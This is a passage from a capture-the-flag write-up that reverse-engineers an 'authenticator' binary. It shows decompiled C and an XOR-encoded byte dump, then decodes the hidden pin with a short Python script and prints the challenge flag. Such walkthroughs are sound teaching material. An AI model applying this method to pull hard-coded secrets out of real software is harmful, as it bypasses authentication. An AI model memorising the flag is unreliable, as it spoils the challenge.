style="color:#393A34">(</span><span class="token plain">auStack88</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">"11337\n"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">iVar1 </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">printstr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"Pin: "</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">fgets</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">auStack56</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0x20</span><span class="token punctuation" style="color:#393A34">,</span><span class="token constant" style="color:#36acaa">stdin</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    iVar1 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">checkpin</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">auStack56</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">iVar1 </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token function" style="color:#d73a49">printstr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"Access Granted! Submit pin in the flag format: CHTB{fl4g_h3r3}\n"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">else</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token function" style="color:#d73a49">printstr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"Access Denied!\n"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">else</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">printstr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"Access Denied!\n"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  uVar2 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">lStack16 </span><span class="token operator" style="color:#393A34">!=</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">long</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">in_FS_OFFSET </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x28</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    uVar2 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">__stack_chk_fail</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> uVar2</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>We can see the <code>strcmp</code> function being called, which checks if our Alien ID input (stored in <code>auStack88</code>) is <code>"11337"</code>.</p>
<p>More importantly though, a few lines down we call a function called <code>checkpin</code>  with our input as a param. This is where the magic will presumably happen, so let's check it out.</p>
<p>undefined8 checkpin(long param_1)</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">undefined8 </span><span class="token function" style="color:#d73a49">checkpin</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">long</span><span class="token plain"> param_1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">long</span><span class="token plain"> lVar1</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> iStack36</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  iStack36 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">while</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"> true </span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    lVar1 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">func_0x00100750</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">param_1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">lVar1 </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1U</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&lt;=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ulong</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">long</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">iStack36</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">UNK_00100b98</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">iStack36</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">^</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">9</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">!=</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">byte </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">param_1 </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> iStack36</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">break</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    iStack36 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> iStack36 </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Long story short, what this function does is XOR some variable stored in  <code>&amp;UNK_00100b98</code> byte by byte with a hex value <code>9</code>, and compare it (byte by byte) with our input. And lo and behold, that variable is indeed our weird string we found using strings!</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">        00100b98 7d              ??         7Dh    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        00100b99 61              ??         61h    a</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        00100b9a 3a              ??         3Ah    :</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        00100b9b 56              ??         56h    V</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        00100b9c 68              ??         68h    h</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        00100b9d 7c              ??         7Ch    |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        00100b9e 7d              ??         7Dh    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        00100b9f 61              ??         61h    a</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        00100ba0 3a              ??         3Ah    :</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        00100ba1 67              ??         67h    g</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        00100ba2 7d              ??         7Dh    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        00100ba3 38              ??         38h    8</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        00100ba4 6a              ??         6Ah    j</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        00100ba5 3d              ??         3Dh    =</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        00100ba6 7d              ??         7Dh    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        00100ba7 38              ??         38h    8</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        00100ba8 39              ??         39h    9</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        00100ba9 67              ??         67h    g</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        00100baa 56              ??         56h    V</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        00100bab 3c              ??         3Ch    &lt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        00100bac 70              ??         70h    p</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        00100bad 3c              ??         3Ch    &lt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        00100bae 7d              ??         7Dh    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        00100baf 3a              ??         3Ah    :</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        00100bb0 64              ??         64h    d</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        00100bb1 56              ??         56h    V</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        00100bb2 38              ??         38h    8</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        00100bb3 3c              ??         3Ch    &lt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        00100bb4 56              ??         56h    V</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        00100bb5 67              ??         67h    g</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        00100bb6 39              ??         39h    9</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        00100bb7 7d              ??         7Dh    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        00100bb8 56              ??         56h    V</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        00100bb9 3c              ??         3Ch    &lt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        00100bba 39              ??         39h    9</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        00100bbb 56              ??         56h    V</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        00100bbc 3c              ??         3Ch    &lt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        00100bbd 3a              ??         3Ah    :</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        00100bbe 6a              ??         6Ah    j</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        00100bbf 7c              ??         7Ch    |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        00100bc0 7b              ??         7Bh    {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        00100bc1 3a              ??         3Ah    :</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>So, we knew the pin already, just didn't know we had to XOR it to decypher it. Let's do that! I'm gonna use a python script I wrote for the crypto challenges to XOR my own strings</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">#!/usr/bin/env python3</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ciphertext1 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'9'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ciphertext2 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b'}a:Vh|}a:g}8j=}89gV&lt;p&lt;}:dV8&lt;Vg9}V&lt;9V&lt;:j|{:'</span><span class="token punctuation" style="color:#393A34">.</span><span class="token builtin">hex</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">xor</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">hex1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> hex2</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> getAscii </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">False</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  result </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> ind </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token builtin">range</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">hex1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    longIndex </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> ind</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    shortIndex </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> ind</span><span class="token operator" style="color:#393A34">%</span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">hex2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    hexChar1 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> hex1</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">longIndex</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain">longIndex</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    byte1 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token builtin">int</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">hexChar1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">16</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    hexChar2 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> hex2</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">shortIndex</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain">shortIndex</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    byte2 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token builtin">int</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">hexChar2</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">16</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    asciiNum </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> byte1 </span><span class="token operator" style="color:#393A34">^</span><span class="token plain"> byte2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    result</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">append</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">chr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">asciiNum</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  out </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">''</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">join</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">result</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> getAscii</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'Result:'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> out</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> out</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">else</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    out </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> out</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">encode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'utf-8'</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token builtin">hex</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'Result:'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> out</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> out</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">xored </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> xor</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ciphertext2</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ciphertext1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">True</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>And we get our Pin to be</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">th3_auth3nt1c4t10n_5y5t3m_15_n0t_50_53cur3</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>So, now we can run <code>authenticator</code> once again, and supply it with the Pin, to learn that we already have tha flag:</p>
